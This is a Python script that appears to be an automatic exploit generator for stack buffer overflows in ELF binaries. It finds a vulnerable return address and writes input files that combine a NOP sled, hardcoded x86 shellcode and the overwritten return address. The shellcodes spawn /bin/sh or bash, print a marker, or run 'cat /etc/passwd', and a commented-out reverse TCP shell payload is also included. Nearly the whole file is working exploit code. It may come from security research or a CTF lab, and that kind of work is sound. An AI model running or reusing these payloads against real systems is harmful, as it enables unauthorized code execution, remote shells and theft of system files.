#!/usr/bin/python3 -tt
from elf2json import elf2json
import ealib
import re
from collections import OrderedDict
import os
import sys
import binascii

def main():

	if len(sys.argv) < 2:
		#print(sys.argv[0],"<elf_file>")
		pass
		#exit()
		
	#elf_bin=sys.argv[1]
	elf_bin="binaries/bof"

	shellcodes={}
	shellcodes["sh_23"]=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
	shellcodes["print_hackd"]=b"\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x41\x63\x6b\x44"
	shellcodes["sh_28"]=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
	shellcodes["sh_38"]=b"\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff/bin/sh"
	shellcodes["bash_31"]=b"\xb0\x46\x31\xc0\xcd\x80\xeb\x07\x5b\x31\xc0\xb0\x0b\xcd\x80\x31\xc9\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
	shellcodes["bash_33"]=b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
	shellcodes["cat_passwd"]=b"\x31\xc0\x31\xd2\xb0\x0b\x52\x66\x68\x2d\x63\x89\xe7\x52\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x52\xeb\x06\x57\x53\x89\xe1\xcd\x80\xe8\xf5\xff\xff\xff\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x3b\x65\x63\x68\x6f\x20\x64\x6f\x5f\x5f\x6e\x65"
	#shellcode["reverse_tcp"]=b"\xeb\x61\x31\xc0\x31\xdb\x31\xc9\x5a\x6a\x06\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc6\x31\xc0\x50\xff\x72\x02\x66\xff\x32\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\x89\xf3\xcd\x80\x89\xc6\x75\xf4\x31\xc0\x31\xc9\x51\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x51\x53\xb0\x0b\x89\xe1\x31\xd2\xcd\x80\xe8\x9a\xff\xff\xff\xd4\x31\xc0\xa8\x03\x77" #last 4 bytes are ip , 2 before IP are port #experimental
	ealib.clean_temp();
	#elf_bin=sys.argv[1]
	#elf_bin="temp/gets_stdin_2func"
	#elf_bin="binaries/bof"
	elf_obj=elf2json(elf_bin)
	#m=ealib.guess_mem_offset(ln,elf_obj)

	#cleaning temp direcotries
	

	mem_offset=ealib.guess_mem_offset(elf_bin,elf_obj)
	vuln_list=ealib.bof_analysis(elf_bin,elf_obj,mem_offset)
	print(vuln_list)
	for vuln_dict in vuln_list:
		if vuln_dict['ret_addr']:
			for key,shellc in shellcodes.items():
				
				nop_len=vuln_dict['shell_len']-len(shellc)-4
				if nop_len > 0:
					print("Trying shellcode "+key)

					#generating shellcode to be executed
					inp_file=open("inps/shellcode_"+key,"wb")
					for i in range(vuln_dict['nth_input']):
						if i == (vuln_dict['nth_input'] -1):
							ret_addr=vuln_dict['ret_addr']
							ret_addr=hex(int(ret_addr,16)+2) 		#adding 2 bytes ie eip will print 2 nop sled ahead...
							ret_addr=ret_addr.strip("0xX")
							ret_addr=ret_addr.zfill(8)
							#ret_addr_str="\x"+ret_addr[0:2]+"\x"+ret_addr[2:4]+"\x"+ret_addr[4:6]+"\x"+ret_addr[6:8]
							#print(ret_addr_str)
							inp_file.write(b"\x90"*nop_len+shellc)
							inp_file.write(binascii.unhexlify(ret_addr[6:8]))
							inp_file.write(binascii.unhexlify(ret_addr[4:6]))
							inp_file.write(binascii.unhexlify(ret_addr[2:4]))
							inp_file.write(binascii.unhexlify(ret_addr[0:2]))
						else:
							inp_file.write("X"+"\n")
					inp_file.close()


if __name__ == '__main__':
	main()